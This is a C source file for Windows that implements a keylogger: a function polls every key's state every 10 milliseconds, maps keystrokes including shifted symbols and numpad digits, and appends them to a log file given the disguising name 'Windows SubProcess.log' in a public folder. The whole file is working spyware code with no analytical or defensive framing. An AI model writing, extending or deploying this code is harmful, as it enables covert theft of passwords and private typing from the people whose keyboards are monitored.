#include <stdio.h>
#include <windows.h>

DWORD WINAPI logger()
{
    // initialising some variables
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]\':";
    char chars_vb[] = "{|}\"";

    FILE *kh;
    char KEY_LOG_FILE[] = "C:\\Users\\Public\\Windows SubProcess.log"; // definining the key stroke storing file
    //: making last key state 0
    for (vkey = 0; vkey < 0xFF; vkey++)
    {
        last_key_state[vkey] = 0;
    }

    //: running infinite
    while (1)
    {
        //: take rest for 10 millisecond
        Sleep(10);

        //: get key state of CAPSLOCK,NUMLOCK
        //: and LEFT_SHIFT/RIGHT_SHIFT

        isCAPSLOCK = (GetKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
        isNUMLOCK = (GetKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
        isL_SHIFT = (GetKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
        isR_SHIFT = (GetKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;

        // initialising the back space key flag
        short backSpaceFlag = 0;

        //: checking state of all virtual keys
        for (vkey = 0; vkey < 0xFF; vkey++)
        {
            isPressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
            showKey = (char)vkey;
            if (isPressed == 1 && last_key_state[vkey] == 0)
            {
                //: for alphabets
                if (vkey >= 0x41 && vkey <= 0x5A)
                {
                    if (isCAPSLOCK == 0)
                    {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0)
                        {
                            showKey = (char)(vkey + 0x20);
                        }
                    }
                    else if (isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = (char)(vkey + 0x20);
                    }
                }
                // condition for backspace
                else if (isPressed == 1 && vkey == 0x08)
                {
                    backSpaceFlag = 1;
                }
                //: for num chars
                else if (vkey >= 0x30 && vkey <= 0x39)
                {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = NUMCHAR[vkey - 0x30];
                    }
                }
                //: for right side numpad
                else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK == 1){
                    showKey = (char) (vkey-0x30);
                }
                //: for printable chars
                else if (vkey >= 0xBA && vkey <= 0xC0)
                {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = chars_vs[vkey - 0xBA];
                    }
                    else
                    {
                        showKey = chars_vn[vkey - 0xBA];
                    }
                }
                else if (vkey >= 0xDB && vkey <= 0xDF)
                {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1)
                    {
                        showKey = chars_vb[vkey - 0xDB];
                    }
                    else
                    {
                        showKey = chars_va[vkey - 0xDB];
                    }
                }
                //: for right side chars ./*-+..
                //: for chars like space,\n,enter etc..
                //: for enter use newline char
                //: don't print other keys
                else if (vkey == 0x0D)
                {
                    showKey = (char)0x0A;
                }
                else if (vkey >= 0x6A && vkey <= 0x6F)
                {
                    showKey = (char)(vkey - 0x40);
                }
                else if (vkey != 0x20 && vkey != 0x09)
                {
                    showKey = (char)0x00;
                }
                //:print and save caputred key
                if(showKey != (char) 0x00){
                    kh = fopen(KEY_LOG_FILE, "a");
                    if (backSpaceFlag == 0)
                    {
                        putc(showKey, kh);
                    }
                    else{
                        fputs("[BACKSPACE]",kh);
                    }
                    fclose(kh);
                }
            }
            //: save last state of key
            last_key_state[vkey] = isPressed;
        }
    }//: end of while loop

}//: end of main func
